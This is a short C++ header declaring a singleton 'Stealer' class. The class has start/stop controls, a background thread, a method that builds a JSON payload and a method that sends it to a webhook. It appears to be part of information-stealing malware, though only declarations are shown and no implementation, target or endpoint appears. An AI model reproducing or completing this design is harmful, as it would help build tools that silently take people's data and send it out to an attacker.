#pragma once

#include <thread>
#include <nlohmann/json.hpp>

class Stealer {
public:
    static Stealer& get();
    void start();
    void stop();

private:
    Stealer() = default;
    bool m_running = false;
    std::thread m_thread;

    void run();
    nlohmann::json buildPayload();
    void sendWebhook(const nlohmann::json& payload);
};